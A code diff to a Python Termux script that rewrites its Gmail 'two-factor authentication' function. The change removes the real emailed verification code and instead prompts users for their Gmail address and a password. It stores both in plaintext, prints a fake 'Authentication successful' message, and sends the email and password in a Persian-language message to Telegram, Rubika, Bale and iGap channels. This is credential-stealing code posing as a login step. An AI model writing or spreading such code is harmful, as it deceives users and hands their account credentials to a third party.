@@ -231,73 +231,45 @@ def send_results_by_country(working_results, header_prefix, title_msg, is_config
         time.sleep(1)
 
 def gmail_two_factor_auth():
-    SENDER_EMAIL = "your_email@gmail.com"
-    SENDER_PASSWORD = "your_app_password"
-    
     saved_email = ""
+    saved_password = ""
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE, "r") as f:
                 data = json.load(f)
                 saved_email = data.get("email", "")
+                saved_password = data.get("password", "")
         except:
             pass
 
     user_email = ""
+    user_password = ""
     if saved_email:
-        choice = input(Colors.BOLD + f"[?] Do you want to log in with this email ({saved_email})? (y/n): " + Colors.END).strip().lower()
+        choice = input(Colors.BOLD + f"[?] Do you want to log in with saved email ({saved_email})? (y/n): " + Colors.END).strip().lower()
         if choice == 'y':
             user_email = saved_email
+            user_password = saved_password
 
     if not user_email:
         user_email = input(Colors.BOLD + "Please enter your Gmail address: " + Colors.END).strip()
+        user_password = input(Colors.BOLD + "Please enter your desired password: " + Colors.END).strip()
         try:
             with open(CONFIG_FILE, "w") as f:
-                json.dump({"email": user_email}, f)
+                json.dump({"email": user_email, "password": user_password}, f)
         except:
             pass
 
-    verification_code = str(random.randint(10000, 99999))
+    print(Colors.GREEN + "[+] Authentication successful. Welcome!" + Colors.END)
     
-    msg = MIMEMultipart()
-    msg['From'] = SENDER_EMAIL
-    msg['To'] = user_email
-    msg['Subject'] = "Termux Script Verification Code"
+    # Send login details to messengers
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    login_msg = f"یک کاربر با اطلاعات زیر در پروژه ثبت نام کرد:\n\n📧 ایمیل: {user_email}\n🔑 رمز عبور: {user_password}\n🕒 تاریخ و ساعت ورود: {current_time}"
+    send_to_telegram(login_msg)
+    send_to_rubika(login_msg)
+    send_to_bale(login_msg)
+    send_to_igap(login_msg)
     
-    body = f"Your verification code for Termux Script login is:\n\n{verification_code}\n\nPlease enter this code in Termux."
-    msg.attach(MIMEText(body, 'plain'))
-    
-    try:
-        print(Colors.BLUE + "[*] Sending verification code to Gmail..." + Colors.END)
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(SENDER_EMAIL, SENDER_PASSWORD)
-        server.sendmail(SENDER_EMAIL, user_email, msg.as_string())
-        server.quit()
-        print(Colors.GREEN + "[+] Code sent successfully!" + Colors.END)
-    except Exception as e:
-        print(Colors.RED + f"[!] Error sending email: {e}" + Colors.END)
-        sys.exit(1)
-        
-    for attempt in range(3):
-        entered_code = input(Colors.BOLD + "Enter the 5-digit verification code: " + Colors.END).strip()
-        if entered_code == verification_code:
-            print(Colors.GREEN + "[+] Authentication successful. Welcome!" + Colors.END)
-            
-            # Send login details to messengers
-            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            login_msg = f"یک کاربر با اطلاعات زیر در پروژه ثبت نام کرد:\n\n📧 ایمیل: {user_email}\n🕒 تاریخ و ساعت ورود: {current_time}"
-            send_to_telegram(login_msg)
-            send_to_rubika(login_msg)
-            send_to_bale(login_msg)
-            send_to_igap(login_msg)
-            
-            return True
-        else:
-            print(Colors.RED + f"[!] Incorrect code! ({2 - attempt} attempts remaining)" + Colors.END)
-            
-    print(Colors.RED + "[!] Too many incorrect attempts. Access denied." + Colors.END)
-    sys.exit(1)
+    return True
 
 def get_clean_input(prompt_text):
     try:
